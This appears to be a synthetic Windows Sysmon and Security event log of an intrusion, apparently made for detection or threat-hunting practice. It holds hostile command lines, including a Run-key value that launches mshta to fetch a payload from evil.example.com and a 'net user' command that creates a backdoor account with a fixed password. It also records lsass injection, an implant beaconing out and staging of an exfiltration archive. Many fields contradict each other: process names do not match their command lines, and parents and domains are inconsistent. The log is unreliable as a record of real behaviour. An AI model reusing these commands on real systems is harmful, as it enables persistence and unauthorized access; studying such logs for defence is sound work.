  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:03:05.0000000Z" /><EventRecordID>1544</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:03:05.0000000Z</Data><Data Name="SourceProcessId">15103</Data><Data Name="SourceImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetProcessId">50854</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="NewThreadId">7258</Data><Data Name="StartAddress">0x7ff82f8aeb01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:03:16.0000000Z" /><EventRecordID>1545</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">t.miller</Data><Data Name="Workstation">WKSTN-CHARLIE</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:03:18.0000000Z" /><EventRecordID>1546</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0xd83477</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:07:24.0000000Z" /><EventRecordID>1547</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">.</Data><Data Name="TaskName">\CORP\Backup</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:07:32.0000000Z" /><EventRecordID>1548</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2044-5715-8547-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">28599</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:07:43.0000000Z" /><EventRecordID>1549</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x61d4</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">svchost.exe -k netsvcs</Data><Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x68a</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:08:11.0000000Z" /><EventRecordID>1550</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:08:11.0000000Z</Data><Data Name="ProcessId">49665</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="QueryName">exfil.ngrok.io</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">172.16.5.10</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:08:25.0000000Z" /><EventRecordID>1551</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">SRV-SQL01</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:08:35.0000000Z" /><EventRecordID>1552</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x8395</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xbca</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:08:55.0000000Z" /><EventRecordID>1553</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">.</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::10.0.2.99</Data><Data Name="Status">0x25</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4728</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:09:48.0000000Z" /><EventRecordID>1554</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="MemberSid">S-1-5-21-5651-9040-4845-7148</Data><Data Name="MemberName">CN=jane.smith,DC=contoso,DC=com</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="GroupName">Administrators</Data><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CORP</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:10:07.0000000Z" /><EventRecordID>1555</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5740-3926-3606-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">65176</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:10:34.0000000Z" /><EventRecordID>1556</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="ObjectName">C:\Users\Public\Documents\exfil.zip</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:10:56.0000000Z" /><EventRecordID>1557</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:10:56.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">58983</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data><Data Name="Details">mshta.exe http://evil.example.com/payload.hta</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:11:10.0000000Z" /><EventRecordID>1558</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="Workstation">SRV-WEB01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:11:25.0000000Z" /><EventRecordID>1559</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="Workstation">WKSTN-ALICE</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:13:07.0000000Z" /><EventRecordID>1560</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="ServiceName">WindowsUpdate</Data><Data Name="ServiceFileName">C:\Windows\System32\reg.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:13:32.0000000Z" /><EventRecordID>1561</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:13:32.0000000Z</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="User">NT AUTHORITY\SYSTEM</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.100.10.50</Data><Data Name="SourcePort">13402</Data><Data Name="DestinationIp">10.0.1.12</Data><Data Name="DestinationPort">1337</Data><Data Name="DestinationHostname">evil.example.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:13:35.0000000Z" /><EventRecordID>1562</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:13:35.0000000Z</Data><Data Name="ProcessGuid">{15A0A-14B33-F85A-32C0}</Data><Data Name="ProcessId">22300</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="User">CONTOSO\t.miller</Data><Data Name="ParentProcessId">2827</Data><Data Name="ParentImage">C:\Windows\System32\lsass.exe</Data><Data Name="ParentCommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="Hashes">MD5=d97220a06a53cf78f56a32af9d934917,SHA256=5e2facf393b6cb5e3af2d00585fa32be7596f199bbdf2de2169135ca262674a7</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:13:47.0000000Z" /><EventRecordID>1563</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0x3cda</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="ParentProcessName">C:\Windows\System32\net.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x88e</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:13:57.0000000Z" /><EventRecordID>1564</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:13:57.0000000Z</Data><Data Name="ProcessId">5247</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetFilename">C:\Users\Public\Documents\exfil.zip</Data><Data Name="CreationUtcTime">2024-11-25T16:13:57.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:14:05.0000000Z" /><EventRecordID>1565</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8268-4963-3897-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">33806</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:14:33.0000000Z" /><EventRecordID>1566</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="UtcTime">2024-11-25T16:14:33.0000000Z</Data><Data Name="ProcessId">61303</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="QueryName">update.legit.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.0.2.99</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T16:14:34.0000000Z" /><EventRecordID>1567</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0xbe9919</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  